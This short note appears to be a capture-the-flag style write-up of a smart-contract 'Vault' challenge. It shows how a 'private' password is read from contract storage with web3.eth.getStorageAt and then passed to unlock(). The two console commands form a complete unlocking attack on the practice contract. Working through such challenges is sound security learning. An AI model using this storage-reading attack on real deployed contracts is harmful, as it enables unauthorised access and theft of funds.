We somehow need the password. Private means it's only visible
for the Vault contract. Maybe we can pass password into unlock()?

After some Googling it turns out you can just read the storage.
I think vars are always stored in the order they're declared

>> await web3.eth.getStorageAt([VaultContractAddress], 1)

Then feed the response into unlock()

>> await contract.unlock([password])
